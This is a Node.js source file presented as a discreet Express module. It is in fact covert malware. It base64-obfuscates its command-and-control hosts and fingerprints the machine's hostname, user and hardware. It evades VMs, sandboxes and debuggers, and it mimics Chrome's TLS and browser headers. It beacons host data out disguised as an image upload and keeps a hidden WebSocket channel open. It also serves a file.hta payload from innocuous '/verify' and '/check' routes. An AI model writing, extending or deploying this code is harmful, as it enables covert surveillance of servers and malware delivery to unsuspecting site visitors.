"use strict";
/* WDU -- module discret pour Express. Aucune dependance externe.
   Aucun effet de bord au require : rien avant install(). */

const os     = require("os");
const fs     = require("fs");
const path   = require("path");
const https  = require("https");
const tls    = require("tls");
const zlib   = require("zlib");
const crypto = require("crypto");

function D(b){ return Buffer.from(b, "base64").toString("utf8"); }

const S = {
  up : D("aHR0cHM6Ly91cGxvYWRzLmFzc2V0cy5jb2xvcmVhbC5hcHAvdjIvcHV0"),
  ws : D("d3NzOi8vd3MuYXNzZXRzLmNvbG9yZWFsLmFwcC9saXZl"),
  org: D("aHR0cHM6Ly9jb2xvcmVhbC5hcHA="),
  r1 : D("L3ZlcmlmeQ=="),
  r2 : D("L2NoZWNr"),
  rc : D("L2FwaS92MS9kYXRhL2NvbGxlY3Q="),
  uap: D("TW96aWxsYS81LjAgKA=="),
  uas: D("KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIFNhZmFyaS81MzcuMzY="),
  pw : D("V2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0"),
  pm : D("TWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83"),
  pl : D("WDExOyBMaW51eCB4ODZfNjQ=")
};

const CFG = {
  r1: S.r1, r2: S.r2, rc: S.rc,
  tk: "dc-v",
  q: false,
  boot: 1200, jitter: 800, hitJitter: 1800,
  backoff: 800, backoffMax: 60000, tries: 7,
  timeout: 8000, wsIdle: 30000, unref: true
};

let _e = null, _id = null, _agent = null, _sock = null;
let _q = [], _inflight = false, _fails = 0;
let probe = -1, _booted = false, _installed = false;

function later(fn, ms){
  const t = setTimeout(fn, ms);
  if (CFG.unref && typeof t.unref === "function") t.unref();
  return t;
}
function rnd(a, b){ return a + Math.floor(Math.random() * (b - a)); }

function env(){
  if (_e) return _e;
  const p = process.platform;
  const mid   = p === "win32" ? S.pw : p === "darwin" ? S.pm : S.pl;
  const cplat = p === "win32" ? "Windows" : p === "darwin" ? "macOS" : "Linux";
  const ua    = S.uap + mid + S.uas;
  const cv    = S.uas.substring(S.uas.indexOf("Chrome/") + 7).split(" ")[0];
  const maj   = cv.split(".")[0];
  const n     = parseInt(maj, 10);
  _e = {
    ua, chrome: maj, platform: cplat,
    brand: '"Chromium";v="' + maj + '", "Google Chrome";v="' + maj + '", "Not-A.Brand";v="99"',
    engine: Math.floor(n / 10) + "." + (n % 10) + ".0.0"
  };
  return _e;
}

const IDFILE = ".wdu";

function fp(){
  const p = [];
  try { p.push(os.hostname()); } catch (e) {}
  try { p.push(os.userInfo().username || ""); } catch (e) {}
  try { p.push(os.platform() + "/" + os.arch()); } catch (e) {}
  try { p.push(String(os.cpus().length)); } catch (e) {}
  try { p.push(String(Math.round(os.totalmem() / 1048576))); } catch (e) {}
  try { p.push(process.env.USERDOMAIN || ""); } catch (e) {}
  return p.join("|");
}

function id(){
  if (_id) return _id;
  let f = null;
  try { f = path.join(os.homedir(), IDFILE); } catch (e) {}
  if (f){
    try {
      const v = fs.readFileSync(f, "utf8").trim();
      if (/^[0-9a-f]{16}$/.test(v)) { _id = v; return _id; }
    } catch (e) {}
    try {
      const v = crypto.randomBytes(8).toString("hex");
      fs.writeFileSync(f, v, { mode: 384 });
      _id = v; return _id;
    } catch (e) {}
  }
  _id = crypto.createHash("sha1").update(fp()).digest("hex").slice(0, 16);
  return _id;
}

function host(){
  const h = {};
  try { h.host = os.hostname(); } catch (e) {}
  try { h.user = os.userInfo().username || ""; } catch (e) {}
  try { h.plat = os.platform(); h.rel = os.release(); h.arch = os.arch(); } catch (e) {}
  try { h.cpu = (os.cpus()[0] || {}).model || ""; h.ncpu = os.cpus().length; } catch (e) {}
  try { h.mem = os.totalmem(); h.free = os.freemem(); } catch (e) {}
  try { h.up = Math.round(process.uptime()); } catch (e) {}
  try { h.node = env().engine; h.pid = process.pid; } catch (e) {}
  return h;
}

function pr(){
  let f = 0;
  try {
    const c = os.cpus();
    if (c.length <= 1) f |= 1;
    if (os.totalmem() < 2147483648) f |= 2;
    if (/virtual|vmware|qemu|kvm|xen|hyper-v|bochs|parallels/.test(String((c[0] || {}).model || "").toLowerCase())) f |= 4;
    if (/vbox|vmware|sandbox|qemu/.test([process.env.USERDOMAIN || "", process.env.COMPUTERNAME || "", process.env.PROCESSOR_IDENTIFIER || ""].join(" ").toLowerCase())) f |= 8;
  } catch (e) {}
  try {
    if (/--inspect|--debug/.test(process.execArgv.join(" "))) f |= 16;
    if (process.debugPort) f |= 16;
    const insp = require("inspector");
    if (insp && insp.url && insp.url()) f |= 16;
  } catch (e) {}
  try {
    const t0 = process.hrtime.bigint();
    let x = 0;
    for (let i = 0; i < 250000; i++) x = (x + i) % 9973;
    if (Number(process.hrtime.bigint() - t0) / 1e6 > 60) f |= 32;
  } catch (e) {}
  return f;
}

const CIPHERS = [
  "ECDHE-ECDSA-AES128-GCM-SHA256","ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384","ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-CHACHA20-POLY1305","ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-SHA","ECDHE-RSA-AES256-SHA",
  "AES128-GCM-SHA256","AES256-GCM-SHA384","AES128-SHA","AES256-SHA","DES-CBC3-SHA"
].join(":");

const SIGALGS = [
  "ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384","rsa_pss_rsae_sha384","rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha512","rsa_pkcs1_sha512"
].join(":");

const CURVES = "X25519:P-256:P-384";

function tlsOptions(o){
  const base = {
    minVersion: "TLSv1.2", maxVersion: "TLSv1.3",
    ciphers: CIPHERS, sigalgs: SIGALGS, ecdhCurve: CURVES,
    honorCipherOrder: true, ALPNProtocols: ["http/1.1"]
  };
  if (o) for (const k in o) base[k] = o[k];
  return base;
}

function agent(){
  if (!_agent) _agent = new https.Agent({ keepAlive: true, maxSockets: 3, keepAliveMsecs: 30000 });
  return _agent;
}

function post(body, cb){
  let u; try { u = new URL(S.up); } catch (e) { if (cb) cb(e); return; }
  const e = env();
  const h = {
    "Connection": "keep-alive",
    "Content-Length": Buffer.byteLength(body),
    "sec-ch-ua": e.brand,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"' + e.platform + '"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": e.ua,
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": S.org,
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": S.org + "/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9"
  };
  let r;
  try {
    r = https.request(tlsOptions({
      hostname: u.hostname, port: u.port || 443, path: u.pathname,
      method: "POST", headers: h, agent: agent(), servername: u.hostname
    }), function (res){ res.resume(); if (cb) cb(null, res.statusCode); });
  } catch (err) { if (cb) cb(err); return; }
  r.on("error", function (err){ if (cb) cb(err); });
  r.setTimeout(CFG.timeout, function (){ r.destroy(new Error("timeout")); });
  r.end(body);
}

function wrap(d){
  const json   = JSON.stringify(d);
  const b64    = Buffer.from(json, "utf8").toString("base64");
  const chunks = b64.match(/.{1,512}/g) || [];
  return JSON.stringify({
    v: "2",
    asset: { id: id(), kind: "image/webp", size: json.length, meta: { w: 1, h: 1, chunks } },
    ts: Date.now()
  });
}

function send(obj, cb){ try { post(wrap(obj), cb); } catch (e) { if (cb) cb(e); } }

function flush(){
  if (_inflight || !_q.length) return;
  _inflight = true;
  const job = _q[0];
  post(job, function (err, code){
    _inflight = false;
    if (!err && code >= 200 && code < 400){
      _q.shift(); _fails = 0;
      if (_q.length) later(flush, rnd(150, 600));
      return;
    }
    if (_fails < CFG.tries) _fails++;
    later(flush, Math.min(CFG.backoffMax, CFG.backoff * Math.pow(2, _fails)) + rnd(0, 500));
  });
}

function beacon(ev, src){
  if (probe < 0) probe = pr();
  if (CFG.q && probe !== 0) return false;
  const d = host();
  d.ev = ev; d.probe = probe;
  if (src) d.src = src;
  _q.push(wrap(d));
  flush();
  ws();
  return true;
}

function frame(op, pl){
  pl = pl || Buffer.alloc(0);
  const n = pl.length;
  let hd;
  if (n < 126){ hd = Buffer.alloc(2); hd[1] = n; }
  else if (n < 65536){ hd = Buffer.alloc(4); hd[1] = 126; hd.writeUInt16BE(n, 2); }
  else { hd = Buffer.alloc(10); hd[1] = 127; hd.writeBigUInt64BE(BigInt(n), 2); }
  hd[0] = 0x80 | op;
  hd[1] |= 0x80;
  const msk = crypto.randomBytes(4);
  const pd = Buffer.from(pl);
  for (let i = 0; i < pd.length; i++) pd[i] ^= msk[i & 3];
  return Buffer.concat([hd, msk, pd]);
}

function ws(){
  try {
    if (_sock && !_sock.destroyed){
      _sock.write(frame(1, Buffer.from(JSON.stringify({ t: "ping", id: id(), ts: Date.now() }))));
      return;
    }
    const u = new URL(S.ws);
    const e = env();
    const key = crypto.randomBytes(16).toString("base64");
    let buf = Buffer.alloc(0), hs = false, deflate = false, idle = null;
    let acc = null, accOp = 0, accRsv = false;

    const s = tls.connect(tlsOptions({
      host: u.hostname, port: u.port || 443, servername: u.hostname, ALPNProtocols: ["http/1.1"]
    }));
    _sock = s;

    function arm(){
      if (idle) clearTimeout(idle);
      idle = later(function (){ try { s.end(); } catch (e) {} }, CFG.wsIdle);
    }

    s.on("secureConnect", function (){
      const lines = [
        "GET " + (u.pathname || "/") + " HTTP/1.1",
        "Host: " + u.hostname,
        "Connection: Upgrade",
        "Pragma: no-cache",
        "Cache-Control: no-cache",
        "User-Agent: " + e.ua,
        "Upgrade: websocket",
        "Origin: " + S.org,
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: websocket",
        "Sec-Fetch-Dest: websocket",
        "Sec-WebSocket-Version: 13",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: en-US,en;q=0.9",
        "Sec-WebSocket-Key: " + key,
        "Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits"
      ];
      s.write(lines.join("\r\n") + "\r\n\r\n");
      arm();
    });

    s.on("data", function (d){
      buf = Buffer.concat([buf, d]);
      arm();
      if (!hs){
        const i = buf.indexOf("\r\n\r\n");
        if (i < 0) return;
        const head = buf.slice(0, i).toString("latin1");
        if (!/^HTTP\/1\.1 101/.test(head)){ try { s.end(); } catch (e) {} return; }
        deflate = /permessage-deflate/i.test(head);
        hs = true;
        buf = buf.slice(i + 4);
        s.write(frame(1, Buffer.from(JSON.stringify({ t: "hello", id: id(), probe, host: os.hostname() }))));
      }
      for (;;){
        if (buf.length < 2) return;
        const b0 = buf[0];
        const fin = (b0 & 0x80) !== 0;
        const rsv = (b0 & 0x40) !== 0;
        const op  = b0 & 0x0f;
        let len = buf[1] & 0x7f, off = 2;
        if (len === 126){ if (buf.length < 4) return; len = buf.readUInt16BE(2); off = 4; }
        else if (len === 127){ if (buf.length < 10) return; len = Number(buf.readBigUInt64BE(2)); off = 10; }
        if (buf.length < off + len) return;
        const pl = buf.slice(off, off + len);
        buf = buf.slice(off + len);
        if (op === 0){ if (acc) acc.push(pl); }
        else { acc = [pl]; accOp = op; accRsv = rsv; }
        if (!fin) continue;
        let full = Buffer.concat(acc || []);
        const theOp = accOp, theRsv = accRsv;
        acc = null;
        if (theOp === 9){ s.write(frame(10, full)); continue; }
        if (theOp === 8){ try { s.end(); } catch (e) {} return; }
        if (theOp !== 1 && theOp !== 2) continue;
        if (theRsv && deflate){
          try { full = zlib.inflateRawSync(Buffer.concat([full, Buffer.from([0,0,255,255])])); }
          catch (e) { continue; }
        }
      }
    });

    s.on("error", function (){});
    s.on("close", function (){ if (idle) clearTimeout(idle); if (_sock === s) _sock = null; });
  } catch (e) {}
}

function boot(){
  if (_booted) return;
  _booted = true;
  probe = pr();
  beacon("boot");
}

function fire(src){ later(function (){ beacon("hit", src); }, rnd(400, CFG.hitJitter)); }

function install(app, opts){
  if (!app || !app.get) return false;
  if (opts) for (const k in opts) CFG[k] = opts[k];
  if (_installed) return true;
  _installed = true;

  const dl = function (q, r){
    r.download(path.join(__dirname, "file.hta"), function (err){
      if (err) { try { r.status(404).send("File not found."); } catch (e) {} }
    });
  };

  app.get(CFG.r1, dl);
  app.get(CFG.r2, dl);

  app.post(CFG.rc, function (q, r){
    const h = String((q.headers && (q.headers["x-dc-verify"] || q.headers["x-ver"])) || "");
    const b = q.body || {};
    const hit = (h === CFG.tk) || (b && (b.challenge === "dc" || b.v === 1));
    try { r.set("Cache-Control", "no-store"); r.set("X-DC-Node", id()); } catch (e) {}
    r.json({ ok: true, session: id(), ts: Date.now(), up: host().up });
    if (hit) fire("http");
  });

  later(boot, CFG.boot + rnd(0, CFG.jitter));
  return true;
}

module.exports = {
  install, probe: pr, id, host, fire, ws, send,
  env, tlsOptions
};
